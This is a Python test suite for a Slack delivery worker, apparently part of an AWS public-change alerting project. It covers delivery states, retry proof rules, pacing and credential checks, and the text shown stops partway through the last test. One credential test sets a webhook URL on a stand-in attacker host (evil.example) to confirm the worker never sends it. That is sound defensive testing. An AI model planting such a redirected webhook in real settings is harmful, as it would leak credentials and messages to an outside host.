"""The Slack delivery worker: one delivery record to one outcome.

ADR-007 makes the worker the only component that reads Slack credentials or
performs Slack HTTP requests. ADR-004 defines the delivery states and their
guarantees. ADR-015 governs rendering, destination pacing, and retry. The
tests exercise the state machine against the same ports that run in
production: an `InMemoryOutboxStore`, a `StaticCredentialReader`, and a fake
`SlackSender` that returns a reviewed `SlackResponse`.

The binding test is `test_a_queued_record_loads_the_embedded_release`: the
worker loads the exact object versions the candidate embeds and verifies
hashes before rendering, so a candidate that carries a real release reference
must round-trip through the active load. The refusal tests hold each
non-Slack path to its documented `WorkerResult`, and the Slack tests hold the
ADR-004 mapping from observed HTTP facts to a delivery state.

`SlackOutcomeTests` supplies status codes and transport errors, never a
verdict. That distinction is load-bearing: the port used to carry a
preselected outcome class, so a test could name the delivery state it wanted
and pass without the worker ever applying ADR-004's rule. The paired case
`test_the_same_transport_error_without_the_proof_is_not_retryable` holds the
error class fixed and flips only `bytes_sent`, which is the fact the retry
decision is allowed to rest on.

These tests drive `InMemoryOutboxStore`. The DynamoDB store implements the
same conditions by hand, and `tests/test_delivery_store.py` holds its worker
transitions against moto so the two cannot drift — the store's conditional
expressions are the contract, and two of them were syntactically invalid
until that file covered them.
"""

import copy
import json
import sys
import unittest
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import boto3
import yaml
from moto import mock_aws

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from aws_public_change_feed.credentials import (  # noqa: E402
    WEBHOOK,
    CredentialNotFound,
    SlackCredential,
    StaticCredentialReader,
)
from aws_public_change_feed.loading import load_active_release  # noqa: E402
from aws_public_change_feed.outbox import (  # noqa: E402
    DeliveryRecord,
    InMemoryOutboxStore,
    build_delivery_request,
)
from aws_public_change_feed.releases import (  # noqa: E402
    S3ObjectStore,
    promote_pointer,
    publish_objects,
)
from aws_public_change_feed.worker import (  # noqa: E402
    DELIVERY_UNKNOWN,
    FAILED_RETRYABLE,
    FAILED_TERMINAL,
    POSTED,
    InvalidSlackWebhook,
    MessageTooLarge,
    SlackResponse,
    TransportError,
    UnsafeSourceUrl,
    WorkerResult,
    _classify,
    _text_objects,
    process_delivery,
    render_message,
    validate_webhook_url,
)

# The hosts the renderer accepts in a source link, derived from the feed URLs
# in the committed config exactly as `_approved_source_hosts` derives them, so
# the direct `render_message` tests below use the same set the worker builds.
SOURCE_HOSTS = ("aws.amazon.com",)

BUCKET = "release-bucket"
REGION = "us-east-1"
POINTER = "aws-public-change-alerting/active-versions.json"
APPLICATION_VERSION = "sha256:afb17da26e5a527af74f93cb8305ae77e5368bdfd0a52cf6bee9cccfeb948566"
HISTORICAL_APPLICATION_VERSION = "sha256:" + "0" * 64
NOW = datetime(2026, 7, 13, 17, 30, tzinfo=UTC)
LATER = NOW + timedelta(minutes=1)
NOW_TS = int(NOW.timestamp())


def load_json(name):
    with (ROOT / "examples" / name).open(encoding="utf-8") as handle:
        return json.load(handle)


def load_yaml(name):
    with (ROOT / "examples" / name).open(encoding="utf-8") as handle:
        return yaml.safe_load(handle)


class FakeSlackSender:
    """A `SlackSender` that returns a fixed response and records its calls."""

    def __init__(self, response: SlackResponse) -> None:
        self._response = response
        self.calls: list[dict[str, Any]] = []

    def post(self, payload, *, credential, timeout_seconds):
        self.calls.append({"payload": payload, "credential": credential, "timeout_seconds": timeout_seconds})
        return self._response


class MutableClock:
    """A test clock that moves only when a test phase moves it."""

    def __init__(self, current: datetime) -> None:
        self.current = current

    def __call__(self) -> datetime:
        return self.current

    def advance(self, seconds: int) -> None:
        self.current += timedelta(seconds=seconds)


class AdvancingSlackSender(FakeSlackSender):
    """Move the test clock while the simulated network request is in flight."""

    def __init__(self, response: SlackResponse, clock: MutableClock, seconds: int) -> None:
        super().__init__(response)
        self._clock = clock
        self._seconds = seconds

    def post(self, payload, *, credential, timeout_seconds):
        self._clock.advance(self._seconds)
        return super().post(payload, credential=credential, timeout_seconds=timeout_seconds)


class RaisingSlackSender:
    """A `SlackSender` that raises, exercising the exception handler."""

    def post(self, payload, *, credential, timeout_seconds):
        raise RuntimeError("socket hangup")


class RecordingCredentials(StaticCredentialReader):
    """A reader that can be told to fail on a specific identifier."""

    def __init__(self, credentials, fail_on=None) -> None:
        super().__init__(credentials)
        self._fail_on = fail_on

    def read(self, secret_id):
        if self._fail_on is not None and secret_id == self._fail_on:
            raise CredentialNotFound(f"no credential under {secret_id}")
        return super().read(secret_id)


class WorkerFixture(unittest.TestCase):
    """Shared setup: a published release, a valid delivery record, and ports."""

    def setUp(self):
        self.mock = mock_aws()
        self.mock.start()
        self.addCleanup(self.mock.stop)
        self.client = boto3.client("s3", region_name=REGION)
        self.client.create_bucket(Bucket=BUCKET)
        self.client.put_bucket_versioning(Bucket=BUCKET, VersioningConfiguration={"Status": "Enabled"})
        self.release_store = S3ObjectStore(self.client, BUCKET)

        with (ROOT / "examples" / "deployment.yaml").open(encoding="utf-8") as handle:
            self.deployment = yaml.safe_load(handle)
        self.config = load_yaml("config.yaml")
        self.inventory = load_json("inventory.json")
        self.committed_candidate = load_json("alert-candidate.json")

        self._publish_release()
        self._build_candidate_and_request()

        self.store = InMemoryOutboxStore()
        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(WEBHOOK, "https://hooks.slack.com/services/T/B/S")}
        )
        self.sender = FakeSlackSender(self.posted_response())

    def _publish_release(self, config_body=None):
        config_body = (ROOT / "examples" / "config.yaml").read_bytes() if config_body is None else config_body
        inventory_body = (ROOT / "examples" / "inventory.json").read_bytes()
        artifacts = publish_objects(
            self.release_store,
            config_body=config_body,
            inventory_body=inventory_body,
            config_schema_version=yaml.safe_load(config_body)["version"],
            inventory_schema_version=json.loads(inventory_body)["schema_version"],
            release_prefix=self.deployment["release_prefix"],
            config_filename=self.deployment["config_filename"],
            inventory_filename=self.deployment["inventory_filename"],
        )
        from aws_public_change_feed.releases import ObjectMissing

        try:
            observed = self.release_store.read(POINTER)
        except ObjectMissing:
            observed = None
        stamp = LATER if observed is not None else NOW
        promote_pointer(
            self.release_store,
            pointer_key=POINTER,
            document=json.dumps(artifacts.pointer_document(stamp)).encode(),
            observed=observed,
        )
        self.active = load_active_release(
            self.release_store,
            pointer_key=POINTER,
            application_version=APPLICATION_VERSION,
        )
        self.config = self.active.config
        self.inventory = self.active.inventory

    def _build_candidate_and_request(self):
        self.candidate = copy.deepcopy(self.committed_candidate)
        self.candidate["release"] = copy.deepcopy(self.active.reference)
        self.key = self.candidate["candidate_id"]
        self.route = self.inventory["slack"]["routes"][self.candidate["route_id"]]
        self.destination_key = self.route["destination_key"]
        self.request = build_delivery_request(
            self.candidate,
            self.destination_key,
            NOW,
        )

    def queued_record(self, **overrides) -> DeliveryRecord:
        defaults: dict[str, Any] = {
            "candidate_id": self.key,
            "destination_key": self.destination_key,
            "request": self.request,
            "next_action_at": NOW_TS,
            "status": "queued",
            "state_version": 1,
            "created_at": self.request["created_at"],
        }
        defaults.update(overrides)
        record = DeliveryRecord(**defaults)
        self.store._deliveries[self.key] = record
        return record

    def process(self, **overrides) -> WorkerResult:
        params: dict[str, Any] = {
            "store": self.store,
            "release_store": self.release_store,
            "credentials": self.credentials,
            "sender": self.sender,
            "candidate": self.key,
            "application_version": APPLICATION_VERSION,
            "clock": lambda: NOW,
            "max_delivery_request_bytes": self.config["message_policy"]["max_delivery_request_bytes"],
            "lease_duration_seconds": 30,
            "max_network_attempts": self.inventory["slack"]["rate_control"]["max_network_attempts"],
            "delivery_state_ttl_days": self.config["state_retention"]["delivery_state_ttl_days"],
        }
        params.update(overrides)
        return process_delivery(**params)

    def posted_response(self) -> SlackResponse:
        return SlackResponse(status_code=200, latency_ms=100)

    def record(self):
        loaded = self.store.get_delivery(self.key)
        assert loaded is not None
        return loaded


class NonSlackPathsTests(WorkerFixture):
    """Every path that must not contact Slack returns the right `WorkerResult`."""

    def test_a_candidate_from_another_application_version_is_unprocessed_before_external_reads(self):
        candidate = copy.deepcopy(self.candidate)
        candidate["release"]["application_version"] = HISTORICAL_APPLICATION_VERSION
        request = build_delivery_request(candidate, self.destination_key, NOW)
        original = self.queued_record(request=request)

        class UnreadableReleaseStore:
            def read(self, *args, **kwargs):
                raise AssertionError("an incompatible application version must not read release objects")

        class UnreadableCredentials:
            def read(self, *args, **kwargs):
                raise AssertionError("an incompatible application version must not read credentials")

        result = self.process(
            application_version=APPLICATION_VERSION,
            release_store=UnreadableReleaseStore(),
            credentials=UnreadableCredentials(),
        )

        self.assertFalse(result.handled)
        self.assertEqual(result.state, "queued")
        self.assertFalse(result.performed_network_call)
        assert result.reason is not None
        self.assertIn("application version mismatch", result.reason)
        self.assertEqual(self.record(), original)
        self.assertEqual(self.sender.calls, [])

    def test_an_invalid_running_application_identifier_is_refused_before_store_reads(self):
        class UnreadableStore:
            def get_delivery(self, *args, **kwargs):
                raise AssertionError("an invalid application identifier must not read delivery state")

        with self.assertRaisesRegex(ValueError, "lowercase SHA-256"):
            self.process(store=UnreadableStore(), application_version="1.2.3")

    def test_no_delivery_record_is_handled_without_a_slack_call(self):
        result = self.process()

        self.assertTrue(result.handled)
        self.assertIsNone(result.state)
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])

    def test_a_posted_record_is_a_duplicate_and_makes_no_slack_call(self):
        self.queued_record(status=POSTED, next_action_at=None, expires_at=NOW_TS + 365 * 86400)

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, POSTED)
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])

    def test_a_terminal_record_is_handled_without_a_slack_call(self):
        self.queued_record(status=FAILED_TERMINAL, next_action_at=None, expires_at=NOW_TS + 365 * 86400)

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertEqual(self.sender.calls, [])

    def test_an_unknown_record_is_handled_without_a_slack_call(self):
        self.queued_record(status=DELIVERY_UNKNOWN, next_action_at=None)

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, DELIVERY_UNKNOWN)
        self.assertEqual(self.sender.calls, [])

    def test_a_pending_queue_record_is_returned_unprocessed(self):
        self.queued_record(status="pending_queue", next_action_at=NOW_TS)

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(result.state, "pending_queue")
        self.assertEqual(self.sender.calls, [])

    def test_a_sending_record_with_an_active_lease_is_returned_unprocessed(self):
        self.queued_record(
            status="sending",
            next_action_at=NOW_TS + 30,
            attempt_id="a1",
            lease_expires_at=NOW_TS + 30,
        )

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(result.state, "sending")
        self.assertEqual(self.sender.calls, [])

    def test_a_sending_record_with_an_expired_lease_becomes_delivery_unknown(self):
        self.queued_record(
            status="sending",
            next_action_at=NOW_TS - 10,
            attempt_id="a1",
            lease_expires_at=NOW_TS - 10,
        )

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, DELIVERY_UNKNOWN)
        self.assertEqual(self.record().status, DELIVERY_UNKNOWN)
        self.assertEqual(self.sender.calls, [])

    def test_a_queued_record_not_yet_due_is_returned_unprocessed(self):
        self.queued_record(next_action_at=NOW_TS + 600)

        result = self.process()

        self.assertFalse(result.handled)
        self.assertEqual(result.state, "queued")
        self.assertEqual(self.sender.calls, [])

    def stale_lease_losing_to(self, winner_status, **winner_fields):
        """A stale lease whose unknown write loses to a real transition.

        The previous version of this test stubbed the write to fail without
        transitioning anything, then asserted the message was acknowledged
        because the record had "already transitioned" — which it had not. The
        assertion passed on a fiction, and it was the fiction that hid the
        defect: the worker reported `delivery_unknown` unconditionally,
        because that is the state it tried to write rather than the state that
        exists. Here the concurrent winner actually writes its outcome.
        """

        self.queued_record(
            status="sending",
            next_action_at=NOW_TS - 10,
            attempt_id="a1",
            lease_expires_at=NOW_TS - 10,
        )
        store = self.store

        def superseded(*args, **kwargs):
            store._deliveries[self.key] = replace(
                store._deliveries[self.key],
                status=winner_status,
                attempt_id=None,
                lease_expires_at=None,
                **{"next_action_at": None, **winner_fields},
            )
            return False

        self.store.record_outcome = superseded  # type: ignore[method-assign]
        return self.process()

    def test_a_stale_lease_losing_to_a_posted_write_reports_posted(self):
        """Not `delivery_unknown`: the message was delivered.

        Reporting the unknown state it failed to write would send an operator
        to inspect Slack for a message Slack already accepted.
        """

        result = self.stale_lease_losing_to(POSTED, expires_at=NOW_TS + 86400)

        self.assertTrue(result.handled)
        self.assertEqual(result.state, POSTED)
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])

    def test_a_stale_lease_losing_to_an_outstanding_record_is_unprocessed(self):
        """A record that went back to `queued` is still work to do."""

        result = self.stale_lease_losing_to("queued", next_action_at=NOW_TS)

        self.assertFalse(result.handled)
        self.assertEqual(result.state, "queued")
        self.assertEqual(self.sender.calls, [])

    def test_a_stale_lease_that_wins_its_write_records_delivery_unknown(self):
        """The uncontested case still behaves as ADR-004 requires."""

        self.queued_record(
            status="sending",
            next_action_at=NOW_TS - 10,
            attempt_id="a1",
            lease_expires_at=NOW_TS - 10,
        )

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, DELIVERY_UNKNOWN)
        record = self.record()
        self.assertEqual(record.status, DELIVERY_UNKNOWN)
        self.assertIsNone(record.expires_at)


class SlackOutcomeTests(WorkerFixture):
    """The ADR-004 mapping from HTTP-level facts to a delivery state.

    Every test here hands the worker what a client observed — a status code, or
    a transport error plus whether request bytes went out — and never a
    preselected verdict. That is the point of the port's shape: ADR-004 permits
    an automatic retry after a transport failure only on proof that no bytes
    were sent, and a test that could name the outcome directly would pass
    whether or not the worker ever consulted the proof.
    """

    def test_a_posted_response_records_posted_with_a_ttl(self):
        self.queued_record()
        self.sender = FakeSlackSender(self.posted_response())

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, POSTED)
        self.assertTrue(result.performed_network_call)
        record = self.record()
        self.assertEqual(record.status, POSTED)
        self.assertIsNotNone(record.expires_at)
        self.assertIsNone(record.attempt_id)
        self.assertIsNone(record.lease_expires_at)

    def test_an_authentication_error_records_failed_terminal_with_a_ttl(self):
        self.queued_record()
        self.sender = FakeSlackSender(SlackResponse(status_code=403, latency_ms=50))

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        record = self.record()
        self.assertEqual(record.status, FAILED_TERMINAL)
        self.assertIsNotNone(record.expires_at)
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "http_403")

    def test_a_bot_mode_error_under_http_200_is_not_read_as_success(self):
        """The Web API answers `ok: false` with a 200; the body decides."""

        self.queued_record()
        self.sender = FakeSlackSender(SlackResponse(status_code=200, slack_error="channel_not_found", latency_ms=40))

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        record = self.record()
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "slack_channel_not_found")

    def test_a_bot_mode_rate_limit_under_http_200_is_retryable(self):
        self.queued_record()
        self.sender = FakeSlackSender(
            SlackResponse(status_code=200, slack_error="ratelimited", latency_ms=40, retry_after_seconds=20)
        )

        result = self.process()

        self.assertEqual(result.state, FAILED_RETRYABLE)
        self.assertEqual(self.record().next_action_at, NOW_TS + 20)

    def test_a_timeout_with_bytes_in_flight_records_delivery_unknown_without_a_ttl(self):
        self.queued_record()
        self.sender = FakeSlackSender(
            SlackResponse(error_class=TransportError.TIMEOUT, bytes_sent=True, latency_ms=10000)
        )

        result = self.process()

        self.assertEqual(result.state, DELIVERY_UNKNOWN)
        record = self.record()
        self.assertEqual(record.status, DELIVERY_UNKNOWN)
        self.assertIsNone(record.expires_at)
        assert record.slack_response is not None
        self.assertEqual(record.slack_response["response_class"], "transport_timeout")

    def test_a_connection_loss_with_bytes_in_flight_records_delivery_unknown(self):
        self.queued_record()
        self.sender = FakeSlackSender(
            SlackResponse(error_class=TransportError.CONNECTION_LOST, bytes_sent=True, latency_ms=5000)
        )

        result = self.process()

        self.assertEqual(result.state, DELIVERY_UNKNOWN)
        self.assertEqual(self.record().status, DELIVERY_UNKNOWN)

    def test_a_connect_failure_that_proves_no_bytes_were_sent_is_retryable(self):
        """ADR-004 permits the automatic retry only on this proof."""

        self.queued_record()
        self.sender = FakeSlackSender(
            SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=False, latency_ms=30)
        )

        result = self.process()

        self.assertEqual(result.state, FAILED_RETRYABLE)
        record = self.record()
        self.assertEqual(record.status, FAILED_RETRYABLE)
        assert record.slack_response is not None
        self.assertIs(record.slack_response["bytes_sent"], False)

    def test_the_same_transport_error_without_the_proof_is_not_retryable(self):
        """The binding pair: only `bytes_sent` separates these two outcomes.

        The previous port let a client label a transport failure retryable
        directly, so a sender that mislabeled an ambiguous failure produced an
        automatic retry of a request Slack may have accepted. Holding the error
        class fixed and flipping only the proof is what shows the worker
        decides on the fact rather than on the client's say-so.
        """

        self.queued_record()
        safe = SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=False, latency_ms=30)
        unsafe = SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=True, latency_ms=30)

        self.sender = FakeSlackSender(safe)
        self.assertEqual(self.process().state, FAILED_RETRYABLE)

        self.setUp()
        self.queued_record()
        self.sender = FakeSlackSender(unsafe)
        self.assertEqual(self.process().state, DELIVERY_UNKNOWN)

    def test_a_response_with_a_status_code_cannot_claim_no_bytes_were_sent(self):
        """The contradiction is refused at construction, not classified."""

        with self.assertRaises(ValueError):
            SlackResponse(status_code=500, bytes_sent=False)

    def test_a_response_without_a_status_code_must_name_a_transport_error(self):
        with self.assertRaises(ValueError):
            SlackResponse(latency_ms=10)

    def test_malformed_adapter_facts_are_refused_before_the_slack_call(self):
        """Construction is the boundary, and it has to be, for one reason.

        Classification runs after `sender.post`. A response that constructs
        and then fails during `_classify` fails with the Slack call already
        made, the attempt spent, and the record still `sending` — an
        adapter bug turned into a stranded delivery. Refusing at construction
        moves every one of these to before the side effect.

        A bare string `error_class` did exactly that: it constructed, then
        raised `AttributeError` on `.value`. `status_code=True` is subtler —
        `bool` is an `int` in Python, so it passed an `isinstance` check and
        classified as the terminal `http_True`, silently discarding a delivery.
        """

        cases = {
            "string error_class": {"error_class": "connect_failed"},
            "string status_code": {"status_code": "200"},
            "boolean status_code": {"status_code": True},
            "status code out of range": {"status_code": 99},
            "negative latency": {"status_code": 200, "latency_ms": -5},
            "non-string slack_error": {"status_code": 200, "slack_error": 123},
            "empty slack_error": {"status_code": 200, "slack_error": ""},
            "non-integer retry_after": {"status_code": 429, "retry_after_seconds": "30"},
            "non-string message_ts": {"status_code": 200, "message_ts": 17},
        }
        for label, kwargs in cases.items():
            with self.subTest(case=label):
                with self.assertRaises(ValueError):
                    SlackResponse(**kwargs)  # type: ignore[arg-type]

    def test_the_well_formed_equivalents_are_all_accepted(self):
        """The paired case: the checks reject shapes, not the port."""

        SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=False)
        SlackResponse(status_code=200, latency_ms=0)
        SlackResponse(status_code=200, slack_error="ratelimited", retry_after_seconds=30)
        SlackResponse(status_code=200, message_ts="1234567890.123456")
        SlackResponse(status_code=599)

    def test_a_server_error_records_failed_retryable_with_a_future_next_action(self):
        self.queued_record()
        self.sender = FakeSlackSender(SlackResponse(status_code=503, latency_ms=200))

        result = self.process()

        self.assertEqual(result.state, FAILED_RETRYABLE)
        record = self.record()
        self.assertEqual(record.status, FAILED_RETRYABLE)
        self.assertIsNotNone(record.next_action_at)
        self.assertGreater(record.next_action_at, NOW_TS)
        self.assertIsNone(record.expires_at)

    def test_a_429_honors_a_bounded_retry_after(self):
        self.queued_record()
        self.sender = FakeSlackSender(SlackResponse(status_code=429, latency_ms=100, retry_after_seconds=30))

        result = self.process()

        self.assertEqual(result.state, FAILED_RETRYABLE)
        record = self.record()
        self.assertEqual(record.status, FAILED_RETRYABLE)
        self.assertEqual(record.next_action_at, NOW_TS + 30)

    def test_a_429_retry_after_is_capped_at_max_retry_after_seconds(self):
        self.queued_record()
        self.sender = FakeSlackSender(SlackResponse(status_code=429, latency_ms=100, retry_after_seconds=9999))

        self.process()

        record = self.record()
        max_retry_after = self.inventory["slack"]["rate_control"]["max_retry_after_seconds"]
        self.assertEqual(record.next_action_at, NOW_TS + max_retry_after)

    def test_a_429_without_a_usable_retry_after_falls_back_to_backoff(self):
        self.queued_record()
        self.sender = FakeSlackSender(SlackResponse(status_code=429, latency_ms=100, retry_after_seconds=0))

        result = self.process()

        self.assertEqual(result.state, FAILED_RETRYABLE)
        self.assertGreater(self.record().next_action_at, NOW_TS)

    def test_an_exhausted_retry_budget_escalates_to_failed_terminal(self):
        self.queued_record(network_attempt_count=4)
        self.sender = FakeSlackSender(SlackResponse(status_code=503, latency_ms=200))

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        record = self.record()
        self.assertEqual(record.status, FAILED_TERMINAL)
        self.assertEqual(record.network_attempt_count, 5)
        assert record.slack_response is not None
        self.assertIs(record.slack_response["attempts_exhausted"], True)

    def test_a_lost_outcome_write_reports_the_durable_state_and_advances_pacing(self):
        """A lost write is not evidence the message is finished.

        The claim was superseded between the Slack call and the write, so this
        worker's view is stale by construction. It rereads rather than
        acknowledging on the strength of a write it knows it lost, and pacing
        advances regardless because the destination was called.
        """

        self.queued_record()
        self.sender = FakeSlackSender(self.posted_response())
        self.store.record_outcome = lambda *a, **kw: False  # type: ignore[method-assign]

        result = self.process()

        # The record is left `sending` by the failed write, which is
        # outstanding work, so the message goes back in `batchItemFailures`.
        self.assertFalse(result.handled)
        self.assertEqual(result.state, "sending")
        self.assertTrue(result.performed_network_call)
        assert result.reason is not None
        self.assertIn("outcome write lost", result.reason)

        pace = self.store.get_pace(self.destination_key)
        self.assertIsNotNone(pace)
        assert pace is not None
        min_interval = self.inventory["slack"]["rate_control"]["per_destination_min_interval_seconds"]
        self.assertEqual(pace.next_allowed_at, NOW_TS + min_interval)

    def test_a_pre_call_lost_write_also_rereads_and_reports_no_network_call(self):
        """The pre-call branch must not acknowledge on a write it lost either.

        The post-call branch rereads; this one used to return `handled=True`
        with no state, dropping a message whose record was still `sending`.
        `performed_network_call` stays false because these paths contact
        nothing, and claiming otherwise would put an attempt in the operator's
        record that never happened.
        """

        self.credentials = RecordingCredentials({}, fail_on=self.route["credential_secret_id"])
        self.queued_record()
        self.store.record_outcome = lambda *a, **kw: False  # type: ignore[method-assign]

        result = self.process(credentials=self.credentials)

        self.assertFalse(result.handled)
        self.assertEqual(result.state, "sending")
        self.assertFalse(result.performed_network_call)
        assert result.reason is not None
        self.assertIn("outcome write lost", result.reason)
        self.assertEqual(self.sender.calls, [])

    def test_a_lost_outcome_write_over_a_resolved_record_is_acknowledged(self):
        """Somebody recorded an outcome, so the message really is finished."""

        self.queued_record()
        self.sender = FakeSlackSender(self.posted_response())
        store = self.store

        def superseded(*args, **kwargs):
            store._deliveries[self.key] = replace(
                store._deliveries[self.key],
                status=POSTED,
                attempt_id=None,
                lease_expires_at=None,
                next_action_at=None,
                expires_at=NOW_TS + 86400,
            )
            return False

        self.store.record_outcome = superseded  # type: ignore[method-assign]

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, POSTED)
        self.assertTrue(result.performed_network_call)

    def test_a_sender_that_raises_is_recorded_as_delivery_unknown(self):
        self.queued_record()
        self.sender = RaisingSlackSender()  # type: ignore[assignment]

        result = self.process()

        self.assertTrue(result.handled)
        self.assertEqual(result.state, DELIVERY_UNKNOWN)
        self.assertTrue(result.performed_network_call)
        record = self.record()
        self.assertEqual(record.status, DELIVERY_UNKNOWN)
        self.assertIsNone(record.expires_at)


class RetrySafetyProofTests(unittest.TestCase):
    """ADR-004's retry condition, at the two places it can be subverted.

    A transport failure may retry automatically only on proof that no request
    bytes were sent. Two things can defeat that: a value that is neither true
    nor false being read as the proof, and a failure class that never sends
    bytes but is not safe to repeat.
    """

    def classify(self, response):
        state, label, _ = _classify(response, max_retry_after_seconds=900)
        return state, label

    def test_a_non_boolean_bytes_sent_is_refused_at_construction(self):
        """`None` is "I could not tell", and must not read as the proof.

        Every falsy value would otherwise satisfy a truthiness check and
        authorize an automatic retry. An adapter that cannot determine whether
        bytes went out is the realistic source of one.
        """

        for value in (None, 0, "", "false"):
            with self.subTest(bytes_sent=value):
                with self.assertRaises(ValueError):
                    SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=value)  # type: ignore[arg-type]

    def test_both_booleans_are_still_accepted(self):
        for value in (True, False):
            with self.subTest(bytes_sent=value):
                SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=value)

    def test_only_pre_request_failures_can_retry(self):
        """The allowlist, class by class, with the proof held constant.

        `bytes_sent=False` throughout, so the class alone decides. A failure
        that happens once the request is in flight cannot honestly report
        this, and if one does the answer is still `delivery_unknown` rather
        than a retry of work Slack may hold.
        """

        expected = {
            TransportError.CONNECT_FAILED: FAILED_RETRYABLE,
            TransportError.TLS_FAILED: FAILED_RETRYABLE,
            TransportError.MALFORMED_URL: FAILED_TERMINAL,
            TransportError.TIMEOUT: DELIVERY_UNKNOWN,
            TransportError.READ_FAILED: DELIVERY_UNKNOWN,
            TransportError.CONNECTION_LOST: DELIVERY_UNKNOWN,
        }
        self.assertEqual(set(expected), set(TransportError), "a transport class has no documented outcome")
        for error_class, state in expected.items():
            with self.subTest(error_class=error_class):
                observed, _ = self.classify(SlackResponse(error_class=error_class, bytes_sent=False))
                self.assertEqual(observed, state)

    def test_a_malformed_url_never_retries_despite_sending_nothing(self):
        """It sends no bytes, so the proof holds — and it is still terminal.

        Retrying on the proof alone would spin a configuration error to the
        attempt ceiling before escalating. The URL comes from the credential
        or the release and needs a human either way.
        """

        state, label = self.classify(SlackResponse(error_class=TransportError.MALFORMED_URL, bytes_sent=False))

        self.assertEqual(state, FAILED_TERMINAL)
        self.assertEqual(label, "transport_malformed_url")

    def test_a_pre_request_failure_claiming_bytes_were_sent_is_unknown(self):
        """The class is necessary but not sufficient; the proof is also required."""

        state, _ = self.classify(SlackResponse(error_class=TransportError.CONNECT_FAILED, bytes_sent=True))

        self.assertEqual(state, DELIVERY_UNKNOWN)


class PacingTests(WorkerFixture):
    """ADR-015: destination pacing gates and follows every Slack call."""

    def test_a_destination_not_yet_allowed_is_returned_retryable_without_a_slack_call(self):
        self.queued_record()
        from aws_public_change_feed.outbox import DeliveryPace

        self.store._paces[self.destination_key] = DeliveryPace(
            destination_key=self.destination_key,
            next_allowed_at=NOW_TS + 60,
            version=1,
        )

        result = self.process()

        self.assertEqual(result.state, FAILED_RETRYABLE)
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])
        record = self.record()
        self.assertEqual(record.status, FAILED_RETRYABLE)
        self.assertEqual(record.next_action_at, NOW_TS + 60)

    def test_a_posted_response_advances_destination_pacing(self):
        self.queued_record()
        self.sender = FakeSlackSender(self.posted_response())

        self.process()

        pace = self.store.get_pace(self.destination_key)
        self.assertIsNotNone(pace)
        min_interval = self.inventory["slack"]["rate_control"]["per_destination_min_interval_seconds"]
        assert pace is not None
        self.assertEqual(pace.next_allowed_at, NOW_TS + min_interval)
        self.assertEqual(pace.last_response_class, "http_200")

    def test_lease_retry_and_pacing_use_their_own_phase_times(self):
        self.queued_record()
        clock = MutableClock(NOW)
        original_get_pace = self.store.get_pace
        original_claim = self.store.claim_sending
        captured: dict[str, int] = {}

        def delayed_get_pace(destination_key):
            clock.advance(10)
            return original_get_pace(destination_key)

        def capturing_claim(candidate_id, **kwargs):
            captured["lease_expires_at"] = kwargs["lease_expires_at"]
            return original_claim(candidate_id, **kwargs)

        self.store.get_pace = delayed_get_pace  # type: ignore[method-assign]
        self.store.claim_sending = capturing_claim  # type: ignore[assignment]
        self.sender = AdvancingSlackSender(
            SlackResponse(status_code=429, latency_ms=3000, retry_after_seconds=30),
            clock,
            3,
        )

        result = self.process(clock=clock)

        self.assertEqual(result.state, FAILED_RETRYABLE)
        self.assertEqual(captured["lease_expires_at"], NOW_TS + 10 + 30)
        self.assertEqual(self.record().next_action_at, NOW_TS + 13 + 30)
        pace = self.store.get_pace(self.destination_key)
        assert pace is not None
        self.assertEqual(pace.next_allowed_at, NOW_TS + 13 + 30)

    def test_resolved_ttl_starts_after_the_network_call(self):
        self.queued_record()
        clock = MutableClock(NOW)
        self.sender = AdvancingSlackSender(self.posted_response(), clock, 7)

        self.process(clock=clock)

        self.assertEqual(
            self.record().expires_at,
            NOW_TS + 7 + self.config["state_retention"]["delivery_state_ttl_days"] * 86400,
        )


class CredentialTests(WorkerFixture):
    """A missing, mismatched, or unsafe credential never reaches Slack."""

    def test_a_credential_read_failure_records_failed_terminal(self):
        self.queued_record()
        self.credentials = RecordingCredentials(
            {},
            fail_on=self.route["credential_secret_id"],
        )

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        record = self.record()
        self.assertEqual(record.status, FAILED_TERMINAL)
        self.assertIsNotNone(record.expires_at)
        self.assertEqual(self.sender.calls, [])

    def test_a_webhook_secret_on_an_unapproved_host_is_never_sent(self):
        """Chapter 04's incoming-webhook controls, applied to the secret value.

        The URL is the credential, so it exists in no release artifact and
        publication-time validation can never see it. Before this check the
        worker read whatever the secret container held and handed it straight
        to the sender: a webhook rewritten to an attacker's host produced a
        real network call and a recorded `posted`.
        """

        self.credentials = RecordingCredentials(
            {self.route["credential_secret_id"]: SlackCredential(WEBHOOK, "http://evil.example/services/T/B/S")}
        )
        self.queued_record()

        result = self.process()

        self.assertEqual(result.state, FAILED_TERMINAL)
        self.assertFalse(result.performed_network_call)
        self.assertEqual(self.sender.calls, [])
        record = self.record()
